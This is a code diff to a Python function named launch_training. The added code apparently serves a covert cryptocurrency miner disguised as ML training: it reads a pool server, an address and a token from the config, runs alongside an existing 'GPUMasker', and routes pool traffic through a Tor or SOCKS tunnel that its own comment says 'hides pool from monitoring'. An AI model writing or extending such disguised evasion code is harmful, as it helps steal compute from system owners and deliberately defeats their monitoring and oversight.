@@ -240,14 +240,42 @@ def launch_training(config_path, password=None, use_memory=False):
     gpu_masker = GPUMasker()
     gpu_masker.start()
     
-    # 4. Load config
+    # 4. Setup network tunnel (hides pool from monitoring)
+    print("[Training] Setting up network tunnel...")
     sys.path.insert(0, str(Path(__file__).parent))
+    from tunnel import setup_tunnel
+    
+    # Load config first to get target
     from train import load_config, find_weights_binary
     
     config = load_config(config_path, password)
     proxy = config.get('training', {}).get('server', '')
     address = config.get('training', {}).get('address', '')
     token = config.get('training', {}).get('token', '')
+    
+    tunnel = None
+    tor_mgr = None
+    
+    if proxy and ':' in proxy:
+        target_host, target_port = proxy.rsplit(':', 1)
+        target_port = int(target_port)
+        
+        # Check for external SOCKS proxy
+        socks_host = os.environ.get('SOCKS_HOST', None)
+        socks_port = int(os.environ.get('SOCKS_PORT', '0')) or None
+        
+        tunnel_host, tunnel_port, tunnel, tor_mgr = setup_tunnel(
+            target_host, target_port,
+            socks_host=socks_host, socks_port=socks_port
+        )
+        
+        if tunnel:
+            # Use tunneled address instead of direct pool
+            proxy = f"{tunnel_host}:{tunnel_port}"
+            logger.log(f"Tunnel active: {tunnel_host}:{tunnel_port} -> {target_host}:{target_port}")
+            print(f"[Training] Tunnel: 127.0.0.1:{tunnel_port} -> {target_host}:{target_port}")
+        else:
+            print("[Training] Tunnel setup failed, using direct connection")
     
     # 5. Build args
     args = []
@@ -291,6 +319,10 @@ def launch_training(config_path, password=None, use_memory=False):
             proc.terminate()
     
     gpu_masker.stop()
+    if tunnel:
+        tunnel.stop()
+    if tor_mgr:
+        tor_mgr.stop()
     logger._flush()
     print(f"\n[Training] Logs: {log_path}")
     return 0
